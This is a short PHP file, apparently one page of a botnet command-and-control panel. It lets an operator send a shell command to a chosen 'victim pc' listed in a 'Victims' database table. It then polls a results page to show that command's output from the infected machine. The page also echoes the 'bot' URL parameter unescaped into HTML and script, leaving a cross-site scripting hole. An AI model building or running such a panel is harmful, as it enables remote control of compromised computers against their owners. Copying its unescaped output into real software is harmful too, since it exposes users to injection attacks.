<?php
include 'session.php';
include 'conn.php';

//the transfer from the main page to the personal pc command page
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["command"]) && isset($_POST["bot"])) {
  echo "Command was sent to the victim pc";

  $setCommand = $mysql->prepare("update Victims set command=? where hostname=?");
  $setCommand->bind_param("ss", $_POST["command"], $_POST["bot"]);
  $setCommand->execute();
} else {
  echo "error";
}


?>

<html>
<form action="" method="POST">
  <input type="text" name="command" placeholder="command" />
  <input type="hidden" name="bot" value="<?php echo $_GET['bot']; ?>" />
  <input type="submit" name="submit" value="set command" />
</form>

<textarea id="resultArea"></textarea>

<script>

  function retrieveResult() {

    var xmlReq = new XMLHttpRequest();
    var url = "/showresults.php?bot=" + "<?php echo $_GET['bot']; ?>";
    xmlReq.open("GET", url, false);
    xmlReq.send(null);

    if (xmlReq.responseText.length > 2) {
      document.getElementById("resultArea").innerHTML = xmlReq.responseText;
      return;

    }
    setTimeout(retrieveResult, 2000);

  }

  retrieveResult();

</script>



</html>